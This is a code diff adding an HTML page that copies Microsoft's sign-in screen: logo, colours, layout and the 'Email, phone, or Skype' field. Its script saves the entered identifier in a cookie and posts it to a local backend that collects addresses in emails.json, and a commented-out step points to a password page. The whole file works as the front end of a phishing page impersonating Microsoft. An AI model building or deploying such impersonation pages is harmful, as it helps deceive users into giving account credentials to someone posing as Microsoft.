@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Microsoft-Style Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    /* -----------------------------------------------
+       1. Global reset + box sizing
+       ----------------------------------------------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* -----------------------------------------------
+       2. Body & background gradient 
+       ----------------------------------------------- */
+    body {
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+
+      /* A pastel gradient very close to Microsoft’s login page */
+      background: linear-gradient(
+        135deg,
+        #fdf0f3 0%,
+        #e6f9ed 25%,
+        #e0f3fd 50%,
+        #fffbe6 75%,
+        #fdf0f3 100%
+      );
+      
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* -----------------------------------------------
+       3. White “card” container
+       ----------------------------------------------- */
+    .login-card {
+      background-color: #ffffff;
+      width: 460px;                /* same width as Microsoft’s panel */
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      padding: 32px 42px 24px 42px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* -----------------------------------------------
+       4. Microsoft logo section
+       ----------------------------------------------- */
+    .logo-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .logo-squares {
+      display: grid;
+      grid-template-columns: repeat(2, 12px);
+      grid-template-rows: repeat(2, 12px);
+      gap: 2px;
+      margin-right: 8px;
+    }
+    .logo-squares div {
+      width: 12px;
+      height: 12px;
+    }
+    .logo-squares .sq-red    { background: #f65314; }
+    .logo-squares .sq-green  { background: #7cbb00; }
+    .logo-squares .sq-blue   { background: #00a1f1; }
+    .logo-squares .sq-yellow { background: #ffbb00; }
+
+    .logo-text {
+      font-size: 20px;
+      font-weight: 400;
+      color: #707070;
+      line-height: 1;
+    }
+
+    /* -----------------------------------------------
+       5. “Sign in” heading 
+       ----------------------------------------------- */
+    .login-card h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #333333;
+    }
+
+    /* -----------------------------------------------
+       6. Input field (only bottom border)
+       ----------------------------------------------- */
+    .login-input {
+      font-size: 15px;
+      padding: 8px 4px;
+      border: none;
+      border-bottom: 1px solid #767676; /* only bottom border */
+      outline: none;
+      width: 100%;
+      margin-bottom: 16px;
+      color: #000;
+      background: transparent;
+    }
+
+    .login-input::placeholder {
+      color: #767676;
+    }
+
+    /* -----------------------------------------------
+       7. Links (“Create one!” / “Can’t access…”) 
+       ----------------------------------------------- */
+    .links {
+      font-size: 13px;
+      color: #333333;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+    .links a {
+      color: #0067c5;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .links .create-one {
+      margin-top: 6px;
+      display: inline-block;
+    }
+
+    /* -----------------------------------------------
+       8. “Next” button (right-aligned, not full-width)
+       ----------------------------------------------- */
+    .next-container {
+      display: flex;
+      justify-content: flex-end; /* right-align */
+      margin-bottom: 24px;
+    }
+    .primary-btn {
+      background-color: #005DA6;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 500;
+      padding: 8px 34px;
+      border: none;
+      cursor: pointer;
+      /* no width:100% → natural width based on padding/content */
+    }
+    .primary-btn:hover {
+      background-color: #006bb3;
+    }
+    .primary-btn:active {
+      background-color: #005a9e;
+    }
+
+    /* -----------------------------------------------
+       9. “Sign-in options” (separate from card)
+       ----------------------------------------------- */
+    .options-wrapper {
+      margin-top: 16px; /* space between card and this button */
+      width: 460px;     /* match the card’s width */
+    }
+    .secondary-btn {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      background-color: #ffffff;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      font-size: 14px;
+      color: #333333;
+      padding: 10px 42px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .secondary-btn:hover {
+      background-color: #f5f5f5;
+    }
+    .secondary-btn .icon {
+      margin-right: 8px;
+      width: 20px;
+      height: 20px;
+      object-fit: contain;
+    }
+
+    /* -----------------------------------------------
+       10. Footer links (“Terms” / “Privacy”), if desired
+       ----------------------------------------------- */
+    .footer {
+      font-size: 12px;
+      color: #767676;
+      text-align: center;
+      margin-top: 12px;
+    }
+    .footer a {
+      color: #0067c5;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* -----------------------------------------------
+       11. MOBILE‐SPECIFIC OVERRIDES (≤ 450px wide)
+       ----------------------------------------------- */
+    @media (max-width: 450px) {
+      /* 11.1 Make background white instead of gradient */
+      body {
+        background: #ffffff;
+        align-items: center;
+        justify-content: flex-start; /* push content to top */
+        padding-top: 20px;
+      }
+
+      /* 11.2 “Card” becomes transparent / borderless and full‐width */
+      .login-card {
+        background: none;
+        box-shadow: none;
+        width: 100%;
+        padding: 16px;
+      }
+
+      /* 11.3 Move everything in .login-card to top: remove large bottom margins */
+      .logo-container {
+        margin-bottom: 16px;
+      }
+      .login-card h1 {
+        margin-bottom: 16px;
+      }
+      .login-input {
+        margin-bottom: 12px;
+      }
+      .links {
+        margin-bottom: 16px;
+      }
+      .next-container {
+        margin-bottom: 16px;
+      }
+
+      .primary-btn {
+        width: auto;
+        /* the parent .next-container (justify-content: flex-end) ensures it is right‐aligned */
+        padding: 10px 30px;
+      }
+
+      /* 11.4 Sign‐in options: keep only its own border */
+      .options-wrapper {
+        width: 100%;
+        margin-top: 8px;
+        padding-left: 16px;
+      }
+      .secondary-btn {
+        box-shadow: none;  /* remove shadow so only its border shows */
+        border: 1px solid #cccccc;
+        padding: 10px 16px;
+        width: 380px;
+      }
+
+      /* 11.5 Ensure “Next” button is full‐width on mobile */
+      .primary-btn {
+        width: 100px;
+        text-align: center;
+        padding: 10px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- ===========================
+       White card / login panel
+       =========================== -->
+  <div class="login-card">
+    <!-- 1) Microsoft logo -->
+    <div class="logo-container">
+      <div class="logo-squares">
+        <div class="sq-red"></div>
+        <div class="sq-green"></div>
+        <div class="sq-blue"></div>
+        <div class="sq-yellow"></div>
+      </div>
+      <div class="logo-text">Microsoft</div>
+    </div>
+
+    <!-- 2) “Sign in” heading -->
+    <h1>Sign in</h1>
+
+    <!-- 3) Email / Phone / Skype input (only bottom border) -->
+    <input
+      type="text"
+      id="userIdentifier"
+      class="login-input"
+      placeholder="Email, phone, or Skype"
+      autocomplete="off"
+    />
+
+    <!-- 4) “No account? Create one!” & “Can’t access your account?” -->
+    <div class="links">
+      No account? <a href="./signup.html" class="create-one">Create one!</a><br /><br />
+      <a href="#">Can’t access your account?</a>
+    </div>
+
+    <!-- 5) Next button (right-aligned on desktop; full‐width on mobile) -->
+    <div class="next-container">
+      <a href="./index.html"><button id="nextBtn" class="primary-btn">Next</button></a>
+    </div>
+  </div>
+
+  <!-- ===========================
+       “Sign-in options” (outside the card)
+       =========================== -->
+  <div class="options-wrapper">
+    <button class="secondary-btn" id="optionsBtn">
+      <img src="key.png" alt="Key Icon" class="icon" />
+      <span>Sign-in options</span>
+    </button>
+  </div>
+
+  <script>
+    /* --------------------------------------------------
+       Simple cookie helpers 
+       -------------------------------------------------- */
+    function setCookie(name, value, days) {
+      const date = new Date();
+      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+      const expires = "expires=" + date.toUTCString();
+      document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+    }
+    function getCookie(name) {
+      const key = name + "=";
+      const decoded = decodeURIComponent(document.cookie);
+      const parts = decoded.split(";");
+      for (let i = 0; i < parts.length; i++) {
+        let c = parts[i].trim();
+        if (c.indexOf(key) === 0) {
+          return c.substring(key.length, c.length);
+        }
+      }
+      return "";
+    }
+
+    /* --------------------------------------------------
+       On load, prefill input if cookie named “email” exists 
+       -------------------------------------------------- */
+    window.addEventListener("DOMContentLoaded", () => {
+      const saved = getCookie("email");
+      if (saved) {
+        document.getElementById("userIdentifier").value = saved;
+      }
+    });
+
+    /* --------------------------------------------------
+       “Next” clicked ⇒ store cookie, send to backend, then console.log 
+       -------------------------------------------------- */
+    document.getElementById("nextBtn").addEventListener("click", () => {
+      const val = document.getElementById("userIdentifier").value.trim();
+      if (!val) {
+        console.log("Please enter your email, phone, or Skype.");
+        return;
+      }
+
+      // 1) Store it in a cookie for 7 days:
+      setCookie("email", val, 7);
+
+      // 2) Send to backend so it is appended to emails.json
+      fetch("http://localhost:3000/api/signup", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: val })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          console.log(
+            `Saved "${val}".\n` +
+            `· In a cookie for 7 days (last email).\n` +
+            `· Added to global sign‐up list on the server.`
+          );
+          // In a real flow, you might now redirect to the next screen:
+          // window.location.href = "/enter-password.html";
+        } else {
+          console.log("Server error: could not record your email.");
+          console.error("Backend error response:", data);
+        }
+      })
+      .catch(err => {
+        console.log("Network error: could not reach backend.");
+        console.error("Fetch error:", err);
+      });
+    });
+
+    /* --------------------------------------------------
+       “Sign‐in options” clicked ⇒ just a demo console.log 
+       -------------------------------------------------- */
+    document.getElementById("optionsBtn").addEventListener("click", () => {
+      console.log("Sign-in options clicked. (Implement your logic here.)");
+    });
+  </script>
+</body>
+</html>
